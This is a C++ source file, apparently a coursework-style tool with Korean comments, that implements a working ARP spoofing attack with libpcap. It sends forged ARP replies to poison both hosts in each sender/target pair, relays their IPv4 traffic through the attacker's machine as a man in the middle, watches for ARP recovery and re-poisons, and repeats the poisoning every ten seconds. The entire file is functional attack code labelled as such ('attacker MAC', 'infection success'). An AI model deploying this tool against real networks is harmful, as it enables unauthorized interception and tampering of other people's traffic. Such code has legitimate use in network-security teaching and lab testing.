#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <ctime>
#include <arpa/inet.h>  
#include <csignal>      
#include <vector>       

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;  // 이더넷 헤더
    ArpHdr arp_;  // ARP 헤더
};
#pragma pack(pop)

struct Flow {
    Ip sender_ip;        // 공격 대상 IP
    Ip target_ip;        // 위장할 대상 IP
    Mac sender_mac;      // 공격 대상 MAC
    Mac target_mac;      // 위장할 대상 MAC
};

pcap_t* handle;            // 패킷 캡처 핸들
Mac my_mac;                // 공격자 MAC 주소
std::vector<Flow> flows;   // 동적 크기 플로우 저장 (std::vector 사용)
volatile bool running = true;  // 프로그램 종료 제어 플래그

void signal_handler(int sig) {
    if (sig == SIGINT) {
        printf("\n[*] 인터럽트 신호 수신, 정리 중...\n");
        running = false;
    }
}

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int send_arp_packet(Mac dst_mac, Mac src_mac, Mac target_mac, Ip src_ip, Ip target_ip, bool is_request) {
    EthArpPacket packet;

    // 이더넷 헤더 설정
    packet.eth_.dmac_ = dst_mac;                // 목적지 MAC 주소
    packet.eth_.smac_ = src_mac;                // 소스 MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);     // 이더넷 타입: ARP

    // ARP 헤더 설정
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);    // 하드웨어 타입: 이더넷
    packet.arp_.pro_ = htons(EthHdr::Ip4);      // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::size;               // 하드웨어 주소 길이: 6바이트
    packet.arp_.pln_ = Ip::size;                // 프로토콜 주소 길이: 4바이트
    
    // ARP 요청 또는 응답 설정
    packet.arp_.op_ = htons(is_request ? ArpHdr::Request : ArpHdr::Reply);
    packet.arp_.smac_ = src_mac;                // 발신자 MAC 주소
    packet.arp_.sip_ = htonl(src_ip);           // 발신자 IP 주소
    packet.arp_.tmac_ = target_mac;             // 대상 MAC 주소
    packet.arp_.tip_ = htonl(target_ip);        // 대상 IP 주소

    // 패킷 전송 - 실패하면 -1, 성공하면 0 반환
    return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

// 네트워크 인터페이스의 MAC 주소를 가져오는 함수
int get_mac_address(const char* interface, uint8_t* mac_addr) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket() 실패");
        return -1;
    }

    // 인터페이스 이름 설정
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ifr.ifr_name[IFNAMSIZ-1] = '\0';  // 널 종료자 보장

    // ioctl로 MAC 주소 정보 요청
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl() 실패");
        close(sockfd);
        return -1;
    }

    // MAC 주소 복사 (6바이트)
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    close(sockfd);
    return 0;
}

// MAC 주소 해석 함수 - ARP 요청을 보내고 응답을 기다림
Mac resolve_mac(pcap_t* handle, Ip target_ip, Mac my_mac) {
    // 브로드캐스트 ARP 요청 전송
    send_arp_packet(
        Mac("ff:ff:ff:ff:ff:ff"),  // 브로드캐스트 MAC 주소
        my_mac,                    // 내 MAC 주소
        Mac::nullMac(),            // 대상 MAC (비어있음)
        Ip("0.0.0.0"),             // 소스 IP (의미 없음)
        target_ip,                 // 알아내려는 IP 주소
        true                       // ARP 요청
    );
    
    // 응답 대기 (최대 3초)
    time_t start_time = time(nullptr);
    while (difftime(time(nullptr), start_time) < 3) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        
        // 패킷 캡처 실패 또는 타임아웃시 계속
        if (res <= 0) continue;
        
        // 패킷 길이 확인 (안전성 검사)
        if (header->caplen < sizeof(EthHdr) + sizeof(ArpHdr)) continue;
        
        // 이더넷 헤더 분석
        EthHdr* eth_hdr = (EthHdr*)packet;
        if (eth_hdr->type() != EthHdr::Arp) continue;  // ARP 패킷이 아니면 무시
        
        // ARP 헤더 분석
        ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
        
        // 우리가 찾는 IP의 응답인지 확인
        if (ntohl(arp_hdr->sip()) == static_cast<uint32_t>(target_ip)) {
            return arp_hdr->smac_;  // 찾은 MAC 주소 반환
        }
    }
    
    // 시간 초과시 에러 메시지 출력 후 종료
    printf("IP %s의 MAC 주소 해석 실패\n", std::string(target_ip).c_str());
    exit(-1);
}

int main(int argc, char* argv[]) {
    // 명령줄 인자 검증
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }
    
    // SIGINT 핸들러 등록 (Ctrl+C 처리)
    signal(SIGINT, signal_handler);
    
    // 네트워크 인터페이스 설정
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    // pcap 핸들 열기
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "장치 %s 열기 실패: %s\n", dev, errbuf);
        return -1;
    }
    
    // 플로우 쌍 개수 계산
    int pair_count = (argc - 2) / 2;
    
    // 내 MAC 주소 가져오기
    uint8_t mac_bytes[6];
    if (get_mac_address(dev, mac_bytes) < 0) {
        fprintf(stderr, "MAC 주소 가져오기 실패\n");
        return -1;
    }
    my_mac = Mac(mac_bytes);
    printf("공격자 MAC 주소: %s\n", std::string(my_mac).c_str());
    
    // 각 쌍의 MAC 주소 해석 및 플로우 초기화
    for (int i = 0; i < pair_count; i++) {
        Ip sender_ip = Ip(argv[2 + i*2]);
        Ip target_ip = Ip(argv[3 + i*2]);
        
        // MAC 주소 해석
        printf("sender %s의 MAC 주소 해석 중...\n", std::string(sender_ip).c_str());
        Mac sender_mac = resolve_mac(handle, sender_ip, my_mac);
        
        printf("target %s의 MAC 주소 해석 중...\n", std::string(target_ip).c_str());
        Mac target_mac = resolve_mac(handle, target_ip, my_mac);
        
        // 양방향 플로우 저장 (std::vector 사용)
        // 1. sender → target 방향
        flows.push_back({sender_ip, target_ip, sender_mac, target_mac});
        // 2. target → sender 방향 (양방향 스푸핑을 위해 추가)
        flows.push_back({target_ip, sender_ip, target_mac, sender_mac});
        
        printf("플로우 #%zu, #%zu 초기화 완료: %s ↔ %s\n", 
               flows.size()-2, flows.size()-1,
               std::string(sender_ip).c_str(), 
               std::string(target_ip).c_str());
    }

    // 초기 ARP 스푸핑 수행 (양방향)
    printf("\n초기 ARP 스푸핑 시작...\n");
    for (size_t i = 0; i < flows.size(); i++) {
        // ARP 스푸핑 패킷 전송 (공격자의 MAC을 알려줌)
        if (send_arp_packet(
                flows[i].sender_mac,        // 대상 MAC
                my_mac,                     // 내 MAC
                flows[i].sender_mac,        // 대상 MAC (tmac)
                flows[i].target_ip,         // 위장할 IP
                flows[i].sender_ip,         // 대상 IP
                false                       // ARP 응답
            ) == 0) {
            printf("%s → %s 감염 성공!\n", 
                   std::string(flows[i].sender_ip).c_str(),
                   std::string(flows[i].target_ip).c_str());
        } else {
            printf("%s 감염 실패!\n", std::string(flows[i].sender_ip).c_str());
        }
    }
    printf("모든 대상 양방향 감염 완료\n");

    // 패킷 캡처 및 처리 변수
    struct pcap_pkthdr* header;
    const u_char* packet;
    
    // 시간 측정 시작
    time_t start_time = time(nullptr);

    // 메인 패킷 캡처 및 처리 루프
    printf("\n패킷 모니터링 시작...\n");
    while (running) {  // SIGINT 처리를 위해 true 대신 running 변수 사용
        int res = pcap_next_ex(handle, &header, &packet);
        
        // 패킷 캡처 에러 처리
        if (res == 0) continue;  // 타임아웃, 다시 시도
        if (res < 0) {  // 심각한 오류
            printf("패킷 캡처 오류: %s\n", pcap_geterr(handle));
            break;
        }
        
        // 패킷 길이 확인 (안전성 검사)
        if (header->caplen < sizeof(EthHdr)) continue;
        
        // 이더넷 헤더 추출
        EthHdr* eth_hdr = (EthHdr*)packet;
        
        // ARP 패킷 처리 (복구 시도 감지)
        if (eth_hdr->type() == EthHdr::Arp) {
            // 패킷 길이 추가 확인
            if (header->caplen < sizeof(EthHdr) + sizeof(ArpHdr)) continue;
            
            ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
            
            // 모든 플로우에 대해 복구 시도 검사
            for (size_t i = 0; i < flows.size(); i++) {
                if (arp_hdr->sip() == flows[i].sender_ip && 
                    arp_hdr->tip() == flows[i].target_ip) {
                    
                    printf("[!] %s의 ARP 복구 시도 감지\n", std::string(flows[i].sender_ip).c_str());
                    
                    // 재감염 수행
                    send_arp_packet(
                        flows[i].sender_mac,       // 대상 MAC
                        my_mac,                    // 내 MAC
                        flows[i].sender_mac,       // 대상 MAC (tmac)
                        flows[i].target_ip,        // 위장할 IP
                        flows[i].sender_ip,        // 대상 IP
                        false                      // ARP 응답
                    );
                    printf("→ %s 재감염 완료\n", std::string(flows[i].sender_ip).c_str());
                    break;
                }
            }
        }
        // IP 패킷 처리 (중간자 역할)
        else if (eth_hdr->type() == EthHdr::Ip4) {
            bool packet_handled = false;
            
            // 모든 플로우에 대해 검사
            for (size_t i = 0; i < flows.size(); i++) {
                // sender의 MAC 주소와 일치하는지 확인
                if (eth_hdr->smac_ == flows[i].sender_mac) {
                    // 패킷 릴레이: sender → target
                    eth_hdr->dmac_ = flows[i].target_mac;
                    eth_hdr->smac_ = my_mac;
                    
                    // 수정된 패킷 전송 (캡처된 길이로)
                    if (pcap_sendpacket(handle, packet, header->caplen) == 0) {
                        packet_handled = true;
                    } else {
                        printf("패킷 전송 실패: %s → %s\n", 
                               std::string(flows[i].sender_ip).c_str(),
                               std::string(flows[i].target_ip).c_str());
                    }
                    break;
                }
            }
            
            if (!packet_handled) {
                // 패킷이 처리되지 않았다면 디버그 출력 (선택적)
                // printf("처리되지 않은 패킷: %s → ?\n", std::string(eth_hdr->smac_).c_str());
            }
        }

        // 주기적 재감염 (10초마다)
        time_t current_time = time(nullptr);
        if (difftime(current_time, start_time) >= 10) {
            printf("\n주기적 재감염 수행 중...\n");
            for (size_t i = 0; i < flows.size(); i++) {
                send_arp_packet(
                    flows[i].sender_mac,           // 대상 MAC
                    my_mac,                         // 내 MAC
                    flows[i].sender_mac,           // 대상 MAC (tmac)
                    flows[i].target_ip,            // 위장할 IP
                    flows[i].sender_ip,            // 대상 IP
                    false                          // ARP 응답
                );
            }
            printf("모든 대상 주기적 재감염 완료\n");
            start_time = current_time;  // 시간 리셋
        }
    }

    // 종료 시 핸들 정리
    printf("프로그램 종료 중...\n");
    pcap_close(handle);
    return 0;
}
